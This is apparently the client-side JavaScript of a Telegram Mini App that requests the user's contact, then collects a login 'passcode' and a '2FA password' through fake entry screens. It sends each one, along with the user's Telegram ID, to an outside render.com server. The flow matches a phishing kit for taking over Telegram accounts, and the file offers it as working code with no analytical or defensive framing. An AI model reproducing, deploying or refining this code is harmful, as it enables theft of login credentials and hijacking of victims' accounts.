document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    let page = 'page1';

    console.log("✅ Telegram WebApp initialized");
    console.log("initData:", tg.initData);
    console.log("initDataUnsafe:", tg.initDataUnsafe);
    console.log("Full tg object:", tg);
    
    // Display user info on page for debugging
    const TEST = document.getElementById('TEST');
    if (tg.initDataUnsafe?.user) {
        TEST.textContent = `User: ${tg.initDataUnsafe.user.first_name} (ID: ${tg.initDataUnsafe.user.id})`;
    } else {
        TEST.textContent = "⚠️ No user data available";
    }
    
    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const blur = document.getElementById('blur');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');

    // Store user info globally when available
    let userInfo = null;

    // Try to get user info from Telegram WebApp
    if (tg.initDataUnsafe?.user) {
        userInfo = tg.initDataUnsafe.user;
        console.log('✅ User info loaded:', userInfo);
    }

    loginBtn.addEventListener('click', async () => {
        console.log('🔄 Login button clicked');
        
        // Update user info if now available
        if (tg.initDataUnsafe?.user) {
            userInfo = tg.initDataUnsafe.user;
            console.log('✅ User info available:', userInfo);
        }
        
        try {
            // For testing, if no user info available, show page2 anyway
            if (!userInfo) {
                console.log('⚠️ No user info, but continuing for testing...');
                // You can uncomment this to use a test user ID
                // userInfo = { id: 123456789, first_name: 'Test' };
            }
            
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                console.log('📞 Contact requested:', data);
                if (data.status === 'sent') {
                    showPage2();
                }
            });
            
            // Alternative: just show page2 directly for testing
            // Uncomment the line below if requestContact doesn't work
            // showPage2();
            
        } catch (error) {
            console.log('[ERROR]: ' + error);
            tg.showAlert('Error: ' + error.message);
        }
    });

    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginBtn.style.display = 'none';
    }

    function showPage3() {
        page = 'page3';
        page2.style.display = 'none';
        page3.style.display = 'flex';
        requestAnimationFrame(() => {
            page3.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page3.style.zIndex = '100';
        blur.style.opacity = '1';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        } else if (page === 'page3') {
            blur.style.zIndex = '-1';
            page3.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page3.style.transform = 'translateY(40px)';
            });
        }
    });

    // Handle passcode submission
    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value;
        
        // Try to get latest user info
        const user = tg.initDataUnsafe?.user || userInfo;

        console.log('👤 Checking user data...');
        console.log('   tg.initDataUnsafe:', tg.initDataUnsafe);
        console.log('   user:', user);
        console.log('   stored userInfo:', userInfo);

        if (!passcode) {
            console.log('❌ No passcode entered');
            tg.showAlert('⚠️ Please enter passcode');
            return;
        }

        // If no user info, try alternative methods
        let user_id = null;
        
        if (user && user.id) {
            user_id = user.id;
        } else if (tg.initDataUnsafe?.user?.id) {
            user_id = tg.initDataUnsafe.user.id;
        } else {
            // Try to parse from initData string
            console.log('🔍 Attempting to parse user ID from initData string...');
            const initData = tg.initData;
            console.log('   initData string:', initData);
            
            if (initData) {
                const params = new URLSearchParams(initData);
                const userParam = params.get('user');
                if (userParam) {
                    try {
                        const userData = JSON.parse(userParam);
                        user_id = userData.id;
                        userInfo = userData; // Store for future use
                        console.log('✅ Parsed user ID from initData:', user_id);
                    } catch (e) {
                        console.log('❌ Failed to parse user data:', e);
                    }
                }
            }
        }

        if (!user_id) {
            console.log('❌ No Telegram user ID found');
            console.log('📋 Debug info:');
            console.log('   - tg.initData:', tg.initData);
            console.log('   - tg.initDataUnsafe:', tg.initDataUnsafe);
            console.log('   - Please open this WebApp from Telegram bot');
            tg.showAlert('⚠️ Please open this app from the Telegram bot');
            return;
        }

        console.log('📤 Sending passcode:', passcode);
        console.log('📤 User ID:', user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    passcode: passcode,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Response:', result);
            tg.showAlert('✅ Passcode sent successfully!');
            
            // Show 2FA page after successful passcode submission
            setTimeout(() => {
                showPage3();
            }, 1000);
            
        } catch (err) {
            console.error('❌ Fetch error:', err);
            tg.showAlert('❌ Failed to send passcode');
        }
    });

    // Handle 2FA submission
    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', async () => {
        const twofactor = twofactorInput.value;
        
        // Try to get latest user info
        const user = tg.initDataUnsafe?.user || userInfo;

        console.log('👤 Checking user data for 2FA...');

        if (!twofactor) {
            console.log('❌ No 2FA password entered');
            tg.showAlert('⚠️ Please enter 2FA password');
            return;
        }

        // Use same logic as passcode to get user_id
        let user_id = null;
        
        if (user && user.id) {
            user_id = user.id;
        } else if (tg.initDataUnsafe?.user?.id) {
            user_id = tg.initDataUnsafe.user.id;
        } else {
            const initData = tg.initData;
            if (initData) {
                const params = new URLSearchParams(initData);
                const userParam = params.get('user');
                if (userParam) {
                    try {
                        const userData = JSON.parse(userParam);
                        user_id = userData.id;
                    } catch (e) {
                        console.log('❌ Failed to parse user data:', e);
                    }
                }
            }
        }

        if (!user_id) {
            console.log('❌ No Telegram user ID found');
            tg.showAlert('⚠️ Please open this app from the Telegram bot');
            return;
        }

        console.log('📤 Sending 2FA password');
        console.log('📤 User ID:', user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    twofactor: twofactor,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Response:', result);
            tg.showAlert('✅ 2FA password sent successfully!');
            
        } catch (err) {
            console.error('❌ Fetch error:', err);
            tg.showAlert('❌ Failed to send 2FA password');
        }
    });

    // Handle passcode input display
    const input = document.getElementById('hiddenInput');
    const cells = document.querySelectorAll('.cell');
    const box = document.getElementById('codeBox');

    box.addEventListener('click', () => input.focus());

    input.addEventListener('input', () => {
        const value = input.value.split('');
        cells.forEach((cell, i) => {
            cell.textContent = value[i] || '';
            if (value[i]) {
                requestAnimationFrame(() => {
                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
                });
            } else {
                cell.style.boxShadow = '';
            }
        });
    });
});